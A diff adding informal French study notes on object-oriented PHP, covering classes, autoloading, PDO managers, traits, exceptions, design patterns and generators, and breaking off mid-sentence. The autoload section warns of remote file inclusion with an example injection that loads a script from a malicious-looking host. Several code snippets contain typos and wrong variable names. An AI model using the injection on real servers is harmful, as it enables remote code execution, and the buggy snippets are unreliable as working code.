@@ -1,0 +1,1190 @@
+===[introduction]===
+
+le concept de POO date des annees 1970
+
+===[syntaxe pour declarer une classe]===
+
+on fait comme ca 
+<?php
+
+classe maClasse
+{
+
+}
+
+?>
+
+Pour declarer les attributs et les methodes c'est comme en java, on fait preceder chaque attribut de sa portée
+comme ca 
+
+<?php 
+
+class maClasse
+{
+	private	$_att1;
+	private	$_att2;
+	private	$_att3;
+	private	$_att4;
+
+	public function maMethode()
+	{
+
+	}
+
+}
+
+?>
+
+
+au niveau de la portée on a
+public = attribut accessible en rw depuis dedans et dehors de la classe
+private = attribut accessible en rw depuis la classe, et rien du tout en dehors de la classe
+protected = attribut accessible en rw depuis la classe et toute classe heritéem et rien du tout en dehors
+
+remarque importante: quand on déclare des constantes dans une classe, elles sont forcément statique
+du coup on y accede pas via l'objet mais avec le scope resolution operator
+
+Lors de la declaration des attributs, on peut leur assigner une valeur MAIS SEULEMENT UNE VALEUR SCALAIRE,
+on peut pas utiliser une fonction pour attribuer le resultat
+D'ailleurs avec PHP < 5.6, on ne peut mettre que des valeurs statiques, donc pas de resultat d'operation 
+==> mais probablement qu'on peut faire tout ca dans la méthode constructeur.
+
+Remarque, par soucis de convention les variables membre ont un identifiant qui commence par _
+genre 
+$_pouet
+et les noms de classe commencent par une majuscule
+==> notation PEAR
+
+
+Ensuite, pour instancier un objet on fait
+$pouet = maClasse; //pas de (), on ne parle pas de methode constructeur
+
+et ensuite pour acceder aux attributs de la class on fait
+$pouet->nomID //ATTENTION, on ne met pas le $ pour les attributs, c'est $pouet->_attr et pas $pouet->$attr
+
+Pour avoir acces aux attributs depuis la classe on fait
+$this->nomAttr
+
+
+Enfin, on pourra creer une methode constructeur pour assigner des valeurs de facon un peu plus poussée aux attributs lors
+de l'instanciation.
+
+en fait si on en specifie pas, c'est comme si on avait codé un constructeur vide
+
+
+Pour declarer un constructeur dans la classe on fait 
+public __construct(args)	//ATTENTION c'est pas nomClasse ou __nomClasse ! c'est __construct
+{
+	//faire des trucs
+}
+
+
+Remarque, on conseille fortement d'assigner les attributs dans la methode constructeur en utilisant les mutateurs
+plutot que de les modifier directement afin de respecter le principe d'encapsulation, 
+même si les mutateurs en question sont private
+
+Au niveau organisation, c'est pas comme en java ou il faut que le fichier ai le nom de la classe, on peut avoir plusieurs classe par fichier, etc
+Cependant niveau organisation c'est quand meme beaucoup mieux d'avoir une classe par fichier
+et le nom du fichier qui est le nom de la classe
+
+Et ensuite, pour utiliser une classe dans un autre fichier, faire
+require_once('maClasse.php');
+
+Sauf que si on a plusieurs dizaines de classes c'est la merde
+==> pour regler ca ya l'auto-chargement de classe
+==> on code une ou plusieurs fonctions qui qui tenteront de charger le fichier declarant la classe.
+
+dans la plupart des cas une seule fonction suffit 
+en gros on fait comme ca 
+
+function loadClass($pClass) {
+	require $pClasse.'.php';
+}
+
+ensuite, si on faisait les trucs comme d'hab on appellerait la fonction a chaque fois qu'on veut utiliser une classe, pas tres futé
+du coup on va utiliser la fonction spl_autoload_register(fonction) comme ca 
+(en gros c'est une fonction qui va etre appellée quand une classe non chargée est appelée, et elle va appeller la fonction passée en parametre, et passer en argument à cette fonction le nom de la classe appellée).
+
+du coup après avoir codé notre fonction loadClass, on fait
+spl_autoload_register('loadClass'); // On enregistre la fonction en autoload pour qu'elle soit appelée dès qu'on instanciera une classe non déclarée.
+
+
+En fait, en php, ya ce qu'on appelle une PILE D'AUTOLOADS
+cette pile c'est une liste de fonctions, chaque fonction est appellée dans l'ordre lorsqu'on essaye d'utiliser une classe non déclarée, et a chaque fois ca passe en parametre le nom de la classe en question.
+
+la fonction spl_autoload_register('identifiantFonction') ajoute la fonction à la pile d'autoLoads
+à la base, la pile d'autoloads est vide
+
+==> attention cependant aux failles secu, là on parle d'une fonction qui va require un fichier passé en parametre,
+==> si on arrivait à injecter une instruction du genre 
+$pouet = new http://www.siteHack.com/scriptMalicieux;
+
+ca aurait pour effet de
+require 'http://www.siteHack.com/scriptMalicieux.php';
+et donc de faire executer du code php externe sur le serveur;
+
+
+
+
+===[l'operateur de resolution de portée]===
+
+= scope resolution operator
+c'est ::
+
+c'est ce qui permet d'acceder aux variables et methodes statiques de classes 
+
+genre comme ca 
+(pour rappel, les constantes se déclarent et s'utilisent sans le $)
+
+
+class Pouet
+{
+
+	const C1 = 20;
+	const C2 = 40;
+	const C3 = 60;
+}
+
+et apres on appelle comme ca 
+echo(Pouet::C1);
+
+pour les methodes statiques c'est pareil.
+REMARQUE: une methode statique peut etre appellée via la classe et l'operateur de resolution de portée
+Pouet::methode();
+ou par le biais d'un objet instancié
+monPouet->methode();
+Mais c'est nul et ća leve une erreur E_STRICT donc PAS A FAIRE
+
+Concernant les attributs statiques, c'est pratique pour que tous les objets disposent de la meme valeur, 
+et que certains objets peuvent modifier la valeur de l'attribut statique pour que tous les autres objets
+puissent bénéficier de la modification 
+
+
+REMARQUE: 
+pour appeller une methode statique de la classe à l'interieur de cette classe, 
+il vaut mieux utiliser le kw
+self
+genre
+self::methode();
+
+REMARQUE IMPORTANTE: pour les attributs statiques, on fait
+MaClasse::$attribut
+--> c'est pas comme quand on passe par un objet instancié ou on ne met pas le $ 
+monObjet->attribut;
+
+
+
+===[Manipulation de données stockées]===
+
+en gros c'est utiliser la POO pour gerer les connexion et la recuperation de données depuis une bdd
+
+En fait le principe, c'est d'utiliser une methode constructeur qui prendrait une map/hashtable et qui initialise
+chaque attribut de l'objet avec avec les valeurs de la map
+
+ou alors d'utiliser une methode constructeur qui initialise chaque attribut avec une valeur par defaut
+puis qui va hydrater l'objet, via une methode hydrate($map)
+
+genre
+public function hydrate(array $donnees)
+{
+  if (isset($donnees['id']))
+  {
+    $this->setId($donnees['id']);
+  }
+
+  if (isset($donnees['nom']))
+  {
+    $this->setNom($donnees['nom']);
+  }
+
+  // …
+}
+
+sauf que c'est pas tres flexible, du coup on va faire plutot comme ca 
+
+<?php
+$donnees = [
+  'id' => 16,
+  'nom' => 'Vyk12',
+  'forcePerso' => 5,
+  'degats' => 55,
+  'niveau' => 4,
+  'experience' => 20
+];
+
+puis on va utiliser une boucle pour parcourir l'array et checker pour chaque clé, 
+si l'attribut existe (ca veut dire que le nom du champs de la table doit avoir le MEME que celui de l'attribut de l'objet)
+si oui, on set l'attribut et la valeur de l'array
+genre 
+
+PARCOURS du tableau $donnees (avec pour clé $cle et pour valeur $valeur)
+  On assigne à $setter la valeur « 'set'.$cle », en mettant la 
+  première lettre de $cle en majuscule (utilisation de ucfirst())
+  SI la méthode $setter de notre classe existe ALORS
+    On invoque $setter($valeur)
+  FIN SI
+FIN PARCOURS
+
+en php ca donne 
+
+public function hydrate(array $donnees)
+{
+  foreach ($donnees as $key => $value)
+  {
+	$setterMethodId = 'set'.ucfirst($key);
+	if (method_exists($this, $setterMethodId)) {
+		$this->$method($value);
+	}
+  }
+}
+
+en fait un truc pratique en php objet, c'est qu'on peut faire un truc genre
+$methode = 'sayHello';
+$monObjet->$methode(); //equivalent a $monObjet->sayHello();
+
+un peu comme le truc de $($pouet) genre 
+$caca = 42;
+$pouet = 'caca';
+$machin = $$pouet; //equivalent a $machin = $caca;
+
+
+===[une classe, un role]===
+
+dans la gestion de connexions avec bdd, on serait tente d'implementer des methodes dans notre classe genre
+add()
+remove()
+etc
+
+sauf que d'un point de vue organisationnel c'est pas ouf
+il est plutot recommandé que chaque objet représente une ligne de bdd
+toute la partie gestion de connexion doit etre implementée ailleurs
+genre MVC quoi
+On représente, on ne gère pas
+
+
+pour gerer tout ce qui est relatif a la gestion de bdd on va utiliser un manager
+
+du coup si on a une classe Personnage qui s'hydrate avec les valeurs de la bdd 
+on va avoir une classe PersonnageManager qui va gerer la recup de datas
+elle a besoin de 
+- une connexion bdd = $_db, avec un setter pour modifier la bdd à laquelle on se connecte
+- un moyen d'enregistrer une nouvelle donnée, 
+- un moyen de modifier une donnée, 
+- un moyen de supprimer une donnée, 
+- un moyen de selectionner une donnée, 
+
+==> le fameux CRUD = Create Read Update Delete
+
+
+au final ca a cette gueule la
+<?php
+class PersonnagesManager
+{
+  private $_db; // Instance de PDO
+
+  public function __construct($db)
+  {
+    $this->setDb($db);
+  }
+
+  public function add(Personnage $perso)
+  {
+    $q = $this->_db->prepare('INSERT INTO personnages(nom, forcePerso, degats, niveau, experience) VALUES(:nom, :forcePerso, :degats, :niveau, :experience)');
+
+    $q->bindValue(':nom', $perso->nom());
+    $q->bindValue(':forcePerso', $perso->forcePerso(), PDO::PARAM_INT);
+    $q->bindValue(':degats', $perso->degats(), PDO::PARAM_INT);
+    $q->bindValue(':niveau', $perso->niveau(), PDO::PARAM_INT);
+    $q->bindValue(':experience', $perso->experience(), PDO::PARAM_INT);
+
+    $q->execute();
+  }
+
+  public function delete(Personnage $perso)
+  {
+    $this->_db->exec('DELETE FROM personnages WHERE id = '.$perso->id());
+  }
+
+  public function get($id)
+  {
+    $id = (int) $id;
+
+    $q = $this->_db->query('SELECT id, nom, forcePerso, degats, niveau, experience FROM personnages WHERE id = '.$id);
+    $donnees = $q->fetch(PDO::FETCH_ASSOC);
+
+    return new Personnage($donnees);
+  }
+
+  public function getList()
+  {
+    $persos = [];
+
+    $q = $this->_db->query('SELECT id, nom, forcePerso, degats, niveau, experience FROM personnages ORDER BY nom');
+
+    while ($donnees = $q->fetch(PDO::FETCH_ASSOC))
+    {
+      $persos[] = new Personnage($donnees);
+    }
+
+    return $persos;
+  }
+
+  public function update(Personnage $perso)
+  {
+    $q = $this->_db->prepare('UPDATE personnages SET forcePerso = :forcePerso, degats = :degats, niveau = :niveau, experience = :experience WHERE id = :id');
+
+    $q->bindValue(':forcePerso', $perso->forcePerso(), PDO::PARAM_INT);
+    $q->bindValue(':degats', $perso->degats(), PDO::PARAM_INT);
+    $q->bindValue(':niveau', $perso->niveau(), PDO::PARAM_INT);
+    $q->bindValue(':experience', $perso->experience(), PDO::PARAM_INT);
+    $q->bindValue(':id', $perso->id(), PDO::PARAM_INT);
+
+    $q->execute();
+  }
+
+  public function setDb(PDO $db)
+  {
+    $this->_db = $db;
+  }
+}
+
+
+===[heritage]===
+
+Un truc important pour l'heritage est que quand on a une classe avec
+- des trucs prives
+- des trucs publiques
+
+==> pour pas etre emmerdé on peut utiliser le kw protected, pareil qu'en java quoi
+==> pour la convention PEAR, les trucs privés sont notés _nom et les trucs protected, nom direct.
+
+
+une classe heritée n'aura acces qu'aux trucs publiques = principe d'encapsulation
+
+pour faire une classe derivée on fait comme en java genre 
+class pouet extends prout
+{
+
+}
+
+
+pour appeller une methode de la classe parent dans la classe fille (pour rajouter des instruction dans une fonction 
+override par exemple) on fait
+
+parent::maMethode();
+
+Attention, quand on override une methode, il faut que sa visibilité soit plus/= permissive que pour la classe parent 
+sinon fatal error
+
+
+===[classe /methode abstraite]===
+
+pour faire une classe abstraite = qui ne peut pas être instanciée, genre pour faire des patterns pour generer des classes heritées
+on fait
+abstract class Pouet {
+
+}
+
+On peut egalement faire des methodes abstraites genre 
+public abstract pouet(); //on declare juste son prototype
+
+==> c'est des methodes vides qui ont pour vocation d'etre implémentées dans une classe derivée
+==> une methode abstraite ne peut etre declaree QUE dans une classe abstraite (logique)
+
+
+===[classe /methode / attribut final]===
+
+une classe finale n'est pas heritable
+on fait comme ca 
+final class Pouet {
+
+}
+
+une methode final ne peut pas etre overrided
+un attribut final ne peut pas etre modifié dans une classe fille
+
+
+===[resolution statique a la volée]===
+
+en fait si on fait 2 classes, une Mere et une Fille, et qu'on code une fonction STATIQUE
+pouet() dans la classe Mere (echo 'pouet maman') overrided dans la classe fille (echo 'pouet enfant')
+et une fonction statique test() {self::pouet()} dans Mere non overrided en Fille
+
+et qu'on fait 
+Fille::test()
+==> ca affiche 'pouet maman'
+==> en fait ca execute la methode statique MERE, vu que la methode n'a pas ete overrided dans Fille (self = Mere du coup)
+
+
+pour eviter ces emmerde et transformer tous les self:: en classe fille (en fait, class passée avant le :: genre Fille::test())
+au lieu d'utiliser le kw self::
+on utilise le kw static:: (c'est pareil mais au lieu de désigner la classe dans laquelle on code, 
+ca designe la classe appellante) ==> A NOTER
+
+
+donc en gros, quand on code dans une classe, 
+- self:: = designe la classe dans laquelle on code
+- parent:: = designe la classe de laquelle herite la classe dans laquelle on code
+- static:: = designe la classe appellante
+- $this = designe un pointeur sur l'objet instancié
+
+==> remarque, c'est un peu contre-intuitif car quand on code dans une classe héritée, pour appeller une methode d'un parent on fait
+parent::methode() 
+alors que la methode n'est pas statique... ==> pas rigoureux 
+
+
+===[les methodes magiques]===
+
+Pour rappel, en PHP on a des constantes magiques genre 
+__LINE__ = ligne courante dans le fichier 
+__FILE__ = Le chemin complet et le nom du fichier courant avec les liens symboliques résolus. Si utilisé pour une inclusion, le nom du fichier inclus est retourné. 
+__FUNCTION__ = nom de la fonction courante
+__CLASS__ = nom de la classe courante
+__METHOD__ = nom de la methode courante
+__NAMESPACE__ = nom du namespace courant
+
+
+les methodes magiques, elles, sont des methodes dont le contenu s'execute lorsque se produit un evenement particulier
+genre 
+__construct() c'est une methode qui s'execute quand on instancie un objet
+
+on a donc
+__construct() = tmtc
+__destruct() = idem mais lorsque l'objet est detruit
+__set($attr, $value) void = appellée lorsqu'on essaye d'assigner une valeur a un attribut auquel on n'a pas acces OU n'existe pas
+__get($attr) = appellée quand on essaye d'acceder a un attr auquel on n'a pas acces OU n'existe pas
+__isset($attr) = si on appelle isset() sur un attribut qui n'existe pas ou auquel on n'a pas acces ==> doit renvoyer un bool
+		(en l'occurence si je fais un isset sur un attribut qui existe mais private, isset() renvoit false)
+__unset($attr) void = idem mais pour la fonction unset() = delete de var
+__call($nomMethode, $args[]) = quand on appelle une methode a laquelle on n'a pas acces OU qui n'existe pas
+__callStatic = idem pour les methodes statiques. ATTENTION cette methode faut la declarer STATIQUE du coup ah ah 
+__sleep = methode executée quand on serialize notre objet
+__wakeup = methode executée quand on UNserialize notre objet
+__toString = en gros c'est la methode appellée quand on veut convertir l'objet en string, renvoit une string
+__set_state = appelle quand on utilise la fonction var_export(monObj) 
+__invoke = appellee quand on essaye d'utiliser une instance de l'obj comme une fonction
+__debugInfo = appellée quand on utilise la fonction var_dump
+__clone = appelée quand on copie un objet
+
+
+==> ATTENTION, les méthodes __set et __get REMPLACENT LE MESSAGE D'ERREUR (en fait ca catch l'exception)
+
+
+===[surcharge magique d'attributs ou de methodes]===
+
+en gros c'est creer dynamiquement des attributs ou des methodes
+= possible quand on tente d'acceder a un attribut ou une methode qui n'existe pas ou auquel on n'a pas acces
+==> on peut alors la creer et l'implementer, pourquoi pas
+
+
+===[serialisation et methodes magiques]===
+
+pour rappel, la serialisation c'est le fait de stocker nos objets / variables sur le disque
+en php on fait comme ca 
+
+$a = 'pouet';
+$str = serialize($a);
+file_put_contents('enregistrement', $s);
+
+et ensuite pour deserializer on fait
+$str = file_get_contents('enregistrement');
+$a = unserialize($str);
+
+
+===[objets et references]===
+
+quand on instancie un objet, en fait tous les objets sont traites par reference 
+
+du coup si on fait
+
+$obj = new Objet;
+puis
+$obj2 = $obj; 
+ca copie pas l'objet, ca copie la reference
+pour copier l'objet faut faire 
+
+$obj2 = clone $obj; //==> ca invoque __clone()
+
+
+Attention, du coup si on compare les objets
+le bool 
+($obj == $obj2) renvoit 
+
+en fait, == compare
+- le nom des attributs
+- les valeurs des attributs
+- la classe dont l'objet est une instance (il faut que les 2 objets soient issus de la même classe)
+
+et === compare
+- le fait que les 2 variables designent la meme reference 
+
+
+===[parcourir un objet]===
+
+pour ca on a la boucle foreach
+on fait comme ca 
+
+foreach($obj as $valeur) {	//$valeur c'est la valeur de l'attribut
+
+}
+
+ou alors 
+foreach($obj as $attribut => $valeur) {	//$valeur c'est la valeur de l'attribut
+
+}
+
+en fait, les map c'est des objets quoi
+
+
+===[les interfaces]===
+
+une interface c'est comme une classe mais ya que des prototypes de fonction dedans
+en fait c'est comme une classe abstraite qui n'aurait que des methodes abstraites 
+
+une classe peut implementer plusieurs interfaces
+
+pour declarer une interface on fait comme ca
+
+interface monInterface {
+
+}
+
+important: 
+- tout methode d'une interface doit etre PUBLIQU
+- une interface ne peut pas presenter de methode abstraite ou finale 
+- une interface ne peut pas avoir le meme nom qu'une classe et vice-versa
+
+ensuite pour qu'une classe implemente une ou plusieurs interfaces on fait
+class MaClass implements i1, i2, ... in { 
+	//redefinition des methodes
+}
+
+
+de meme que pour les classes on peut definir des constantes d'interface 
+
+comme ca 
+interface MonI {
+	const MA_CONSTANTE = 42;
+}
+
+et on l'appelle avec l'operateur de resolution de portée 
+
+MonI::MA_CONSTANTE
+
+ou alors
+class MaClass implements MonI {
+
+}
+
+MaClasse::MA_CONSTANTE
+
+ENFIN, on peut faire en sorte que des interfaces herient d'autres interfaces
+==> en gros ca met toutes les constantes et les methodes dedans
+===> ATTENTION on ne peut pas redefinir dans une interface fille des constantes def dans une interface mere 
+
+dans l'heritage d'interface, on peut faire de l'heritage multiple
+
+
+===[modifier le comportement d'un objet lorsqu'il est parcouru]===
+
+un iterateur est un objet pouvant parcourir un iteratif (itarable) qui est egalement un objet, qui est parcourable
+
+l'interface la plus basique pour qu'un objet soit un iterator c'est l'interface 
+Iterator
+= implemente 5 methodes
+- current() = retourne l'element courant 
+- key() = retourne la cle de l'element courant 
+- next() = deplace le pointeur sur l'element suivant 
+- rewind() = remet le pointeur sur le premier element 
+- valid() = verifie si la position courante est valide 
+
+une classe qui implemente Iterator, on peut alors l'utiliser dans une boucle foreach
+
+
+Du coup en implementant ces methodes, on pourra renvoyer l'attribut de l'objet parcouru, ou alors une transformation de sa valeur
+etc etc tout un champs des possibles sacrebleu
+
+
+on a l'interface SeekableIterator qui est pareil mais qui a une methode en plus 
+seek(int) pour positionner le curseur sur un key en particulier 
+
+
+l'interface ArrayAccess permet de manipuler notre objet comme un map en utilisant les crochets
+l'interface Countable, implemantant la methode count() int, valeur renvoyée par la fonction count(monObjet)
+l'interface ArrayIterator, c'est en gros un array parcourable.
+
+
+
+===[les exceptions]===
+
+c'est une facon de gerer les erreurs 
+
+En gros si on constate une erreur dans notre code, on fait 
+throw new Exception('message');
+
+où Exception c'est une classe d'exception, classe mère de pleins d'exceptions 
+et on peut creer nos propres exceptions extends Exception 
+
+remarque: NE JAMAIS LANCER D'EXCEPTIONS DANS UN DESTRUCTEUR
+
+ensuite pour attraper nos exception lancées on fait 
+
+try {
+
+//code qui pourrait throw une exception
+//si ya un throw, ca jump direct au bloc catch sans executer la suite du code du try
+
+} catch (Exception $e) {
+
+//code executé si jamais une exception etait lancée dans le bloc precedent
+} 
+finally {
+// code executé dans tous les cas
+}
+
+$e->getMessage() retourne le message de l'exception
+$e->getCode() retourne le code erreur de l'exception
+
+bien sûr on peut catch differents types d'exception genre 
+try { 
+
+} catch (MonException1) {
+} catch (MonException2) {
+} catch (MonException3) {
+}
+
+
+Exemple des PDOExceptions (qui herite de RuntimeException, classe mere de Exception)
+try
+{
+  $db = new PDO('mysql:host=localhost;dbname=tests', 'root', ''); // Tentative de connexion.
+  echo 'Connexion réussie !'; // Si la connexion a réussi, alors cette instruction sera exécutée.
+}
+
+catch (PDOException $e) // On attrape les exceptions PDOException.
+{
+  echo 'La connexion a échoué.<br />';
+  echo 'Informations : [', $e->getCode(), '] ', $e->getMessage(); // On affiche le n° de l'erreur ainsi que le message.
+}
+
+
+===[conversion des erreurs en exceptions]===
+
+on fait comme ca
+<?php
+class MonException extends ErrorException
+{
+  public function __toString()
+  {
+    switch ($this->severity)
+    {
+      case E_USER_ERROR : // Si l'utilisateur émet une erreur fatale.
+        $type = 'Erreur fatale';
+        break;
+      
+      case E_WARNING : // Si PHP émet une alerte.
+      case E_USER_WARNING : // Si l'utilisateur émet une alerte.
+        $type = 'Attention';
+        break;
+      
+      case E_NOTICE : // Si PHP émet une notice.
+      case E_USER_NOTICE : // Si l'utilisateur émet une notice.
+        $type = 'Note';
+        break;
+      
+      default : // Erreur inconnue.
+        $type = 'Erreur inconnue';
+        break;
+    }
+    
+    return '<strong>' . $type . '</strong> : [' . $this->code . '] ' . $this->message . '<br /><strong>' . $this->file . '</strong> à la ligne <strong>' . $this->line . '</strong>';
+  }
+}
+
+function error2exception($code, $message, $fichier, $ligne)
+{
+  // Le code fait office de sévérité.
+  // Reportez-vous aux constantes prédéfinies pour en savoir plus.
+  // http://fr2.php.net/manual/fr/errorfunc.constants.php
+  throw new MonException($message, 0, $code, $fichier, $ligne);
+}
+
+function customException($e)
+{
+  echo 'Ligne ', $e->getLine(), ' dans ', $e->getFile(), '<br /><strong>Exception lancée</strong> : ', $e->getMessage();
+}
+
+set_error_handler('error2exception');
+set_exception_handler('customException');
+
+
+===[les traits]===
+
+en gros c'est comme une classe mais on l'instancie pas, et une classe peut use plusieurs traits en plus d'implementer des interfaces et heriter d'une classe
+on peut y definir des methodes et des attributs
+on peut y definir des attributs statiques mais c'est pas comme les classes, chaque attribut statique sera indépendant et 
+specifique de la classe
+
+
+on fait comme ca
+
+trait MonTrait {
+
+	public function maMethode() {
+
+	}
+}
+
+et apres 
+class A {
+		use MonTrait;
+}
+
+et comme ca apres on peut faire
+
+$a = new A;
+$a->maMethode();
+
+on peut use plusieurs traits en faisant 
+use trait1, trait2;
+
+si on a des methodes du meme nom dans 2 traits different qu'on use, il faudra preciser laquelle on utilise, comme ca 
+use HTMLFormater, TextFormater
+
+  {
+
+    HTMLFormater::format insteadof TextFormater;
+
+  }
+
+
+par contre, si une methode de classe a la meme nom qu'une methode de trait, la methode de classe a le dessus
+par contre, si une methode de classe mere a le meme nom qu'une methode de trait used dans une classe fille, 
+    c'est la methode de trait qui a le dessus
+
+
+on peut faire des traits qui use d'autres traits
+
+on peut egalement changer la visibilité d'une methode en faisant comme ca 
+<?php
+trait A
+{
+  public function saySomething()
+  {
+    echo 'Je suis le trait A !';
+  }
+}
+
+class MaClasse
+{
+  use A
+  {
+    saySomething as protected;
+  }
+}
+
+$o = new MaClasse;
+$o->saySomething(); // Lèvera une erreur fatale car on tente d'accéder à une méthode protégée.
+
+on peut egalement alias des noms de methodes avec des traits
+genre
+<?php
+trait A
+{
+  public function saySomething()
+  {
+    echo 'Je suis le trait A !';
+  }
+}
+
+class MaClasse
+{
+  use A
+  {
+    saySomething as sayWhoYouAre;
+    //ou saySomething as protected sayWhoYouAre
+  }
+}
+
+$o = new MaClasse;
+$o->sayWhoYouAre(); // Affichera « Je suis le trait A ! »
+$o->saySomething(); // Affichera « Je suis le trait A ! »
+
+enfin, on peut declarer des methodes abstraites dans des traits et les use dans une classe abstraite
+mais a ce moment la autant utiliser une interface...
+
+===[API reflexivité]===
+
+c'est un ensemble de classes qui permettent d'avoir des infos sur nos classes genre
+$classeMagicien = new ReflectionClass('Magicien'); // Le nom de la classe doit être entre apostrophes ou guillemets.
+ou alors
+$classeMagicien = new ReflectionObject($magicien);
+
+pour avoir le nom de la classe on fait 
+$classeMagicien->getName()
+
+
+apres on peut checker si la classe a tel attribut genre 
+$classeMagicien->hasProperty('magie')
+
+ou checker si ya telle methode genre
+$classeMagicien->hasMethode('lancerSort')
+
+ou si ya telle constante 
+$classeMagicien->hasConstant('NEW');
+et recuperer sa valeur
+$classeMagicien->getConstant('NEW');
+
+on peut checker si la classe est dérivée de telle classe
+$classeMagicien->isSubclassOf('Personnage');
+
+on peut savoir si la classe est abstraite 
+$classeMagicien->isAbstract()
+
+ou si elle est final
+$classeMagicien->isFinal()
+
+si elle est instanciable
+$classeMagicien->isInstanciable()
+
+
+on peut checker si c'est une interface
+$classeMagicien->isInterface()
+
+si la classe implemente telle interface
+$classeMagicien->implementsInterface('InterfaceMachin')
+
+et on peut recuperer la liste des interfaces implémentées
+soit en recuperant un tableau avec autant d'objets ReflecionClass instanciés avec le nom de chaque interface
+$classeMagicien->getInterfaces('InterfaceMachin')
+soit en recuperant un tableau avec que les noms des interfaces
+$classeMagicien->getInterfacesNames('InterfaceMachin')
+
+
+===[annotations en php]===
+
+bon faudra potasser ca a un moment. 
+
+On peut utiliser les classes de reflexivité pour recuperer des annotations
+
+===[UML]===
+
+une fleche de A vers B signifie que A est derivé direct de B
+une fleche en pointillé de A vers une interface B signifie que A implemente l'interface B
+
+un trait ou fleche qui relie 2 cases est caractérisé par
+un symbole du côté de la premiere case = cardinalité = nombre de classes 
+un symbole du côté de la seconde case  = cardinalité = nombre de classes 
+un mot suivi d'une fleche = definition de la relation et sens de la relation (genre gere > )
+
+genre si on a une classe PersonnageManager et une classe Personnage, ca sera un trait qui relie les 2 clases
+avec du cote PersonnageManager, à gauche, un 1, du cote Personnage, a droite, un * (pour dire infini) et au milieu yaura ecrit
+gere > 
+
+
++ = public
+- = privé
+# = protected
+
+italique = abstrac
+<<leaf>> methode = final
+
+cardinalité: 
+x = valeur exacte
+x..y = nombre compris entre [x,y]
+* = infini
+x..* = [x, inf]
+
+
+une fleche dont la pointe est un losange unfill signifie AGREGATION
+en gros c'est le fait qu'une classe ai parmi ses attributs une instance d'une autre classe
+
+une fleche d'agregation, mais dont le losange est plein, signifie la composition, qui est un cas particulier d'agregation
+c'est genre si on a A qui a parmis ses attributs une ou plusieurs instances B, 
+et que si on supprime A, on supprime toutes les instances de B, 
+alors c'est un cas de composition
+
+===[design pattern]===
+
+en gros c'est une facon de coder pour eviter d'etre confronté a un probleme (de maintenance le plus souvent)
+
+pattern factory
+---------------
+
+imaginons qu'on bosse sur un gros projet avec pleins de classes liées entre elles
+et on veut modifier une feature, sauf que comme ya pleins de classes deja faites 
+c'est un peu le bordel car il faut qu'on modifie plein de code et notamment le code des new bidule()
+
+du coup pour regler ce probleme, on va utiliser des classes usines ==> yaura plus besoin de mettre de new
+Et pour modifer tous les new, on n'aura qu'a modifier la classe usine
+
+concretement on fait comme ca 
+<?php
+class DBFactory
+{
+  public static function load($sgbdr)
+  {
+    $classe = 'SGBDR_' . $sgbdr;
+    
+    if (file_exists($chemin = $classe . '.class.php'))
+    {
+      require $chemin;
+      return new $classe;
+    }
+    else
+    {
+      throw new RuntimeException('La classe <strong>' . $classe . '</strong> n\'a pu être trouvée !');
+    }
+  }
+}
+
+et apres
+<?php
+try
+{
+  $mysql = DBFactory::load('MySQL');
+}
+catch (RuntimeException $e)
+{
+  echo $e->getMessage();
+}
+
+
+
+ou alors, dans le cas où on utiliserait plusieurs bdd avec plusieurfs identifiants et tout, le bordel 
+<?php
+class PDOFactory
+{
+  public static function getMysqlConnexion()
+  {
+    $db = new PDO('mysql:host=localhost;dbname=tests', 'root', '');
+    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    
+    return $db;
+  }
+  
+  public static function getPgsqlConnexion()
+  {
+    $db = new PDO('pgsql:host=localhost;dbname=tests', 'root', '');
+    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    
+    return $db;
+  }
+}
+
+
+pattern observer
+----------------
+
+en gros c'est pour ecouter ses objets, tout ca on connait deja
+
+pattern strategy
+----------------
+
+en gros c'est separer les algo des classes pour pouvoir se focaliser sur l'optimisation 
+toujours pareil, eviter la duplication de code
+
+
+pattern singleton
+-----------------
+
+c'est une classe qui ne peut etre instanciée qu'une fois 
+en gros ya un attribut private static $instance = null;
+et toute les methodes, meme le constructeur, sont private
+ya qu'une methode public getInstance() qui, 
+si !isset(self::$instance), retourne fait self::$instance = new self;
+et qui return self::$instance;
+vala 
+
+
+===[les generateurs]===
+
+pour rappel sur le fonctionnement des Iterator, Iterator c'est une interface,
+un objet qui implemente cette interface peut etre parcouru
+= implemente 5 methodes
+- current() = retourne l'element courant 
+- key() = retourne la cle de l'element courant 
+- next() = deplace le pointeur sur l'element suivant 
+- rewind() = remet le pointeur sur le premier element 
+- valid() = verifie si la position courante est valide 
+
+==> ca permet de parcourir l'objet avec foreach
+
+
+les generateurs c'est une facon simple et rapide d'implementer des iterators
+en gros c'est une fonction qui contient le kw yield dedans, et du coup 
+ca genere un iterator.
+Explication:
+
+genre pour lire un fichier ligne par ligne on pourrait faire
+
+<?php
+class FileReader implements Iterator
+{
+  protected $file;
+ 
+  protected $currentLine;
+  protected $currentKey;
+ 
+  public function __construct($file)
+  {
+    if (!$this->file = fopen($file, 'r'))
+    {
+      throw new RuntimeException('Impossible d\’ouvrir "' . $file . '"');
+    }
+  }
+ 
+  // Revient à la première ligne
+  public function rewind()
+  {
+    fseek($this->file, 0);
+    $this->currentLine = fgets($this->file);
+    $this->currentKey = 0;
+  }
+ 
+  // Vérifie que la ligne actuelle existe bien
+  public function valid()
+  {
+    return $this->currentLine !== false;
+  }
+ 
+  // Retourne la ligne actuelle
+  public function current()
+  {
+    return $this->currentLine;
+  }
+ 
+  // Retourne la clé actuelle
+  public function key()
+  {
+    return $this->currentKey;
+  }
+ 
+  // Déplace le curseur sur la ligne suivante
+  public function next()
+  {
+    if ($this->currentLine !== false)
+    {
+      $this->currentLine = fgets($this->file);
+      $this->currentKey++;
+    }
+  }
+}
+
+sauf que c'est chiant parce que finalement nous ce qu'on veut c'est generer un tableau
+du coup on peut aussi faire comme ca 
+function readLines($fileName)
+{
+  // Si le fichier est inexistant, on ne continue pas
+  if (!$file = fopen($fileName, 'r')) {
+    return;
+  }
+
+  // Tant qu'il reste des lignes à parcourir
+  while (($line = fgets($file)) !== false)
+  {
+    // On dit à PHP que cette ligne du fichier fait office de « prochaine entrée du tableau »
+    yield $line;
+  }
+
+  fclose($file);
+}
+
+et apres
+<?php
+$generator = readLines('MonFichier');
+foreach ($generator as $line) {
+  // Effectuer une opération sur $line
+}
+
+en fait la fonction readLine() renvoit une instance de classe Generator, implementant Iterator, où tout est implementé
+
+pour renvoyer une clé et une valeur on fait tout simplement 
+yield $key => $val;
+
+les generators disposent, en plus des methodes de Iterator, de 3 methodes
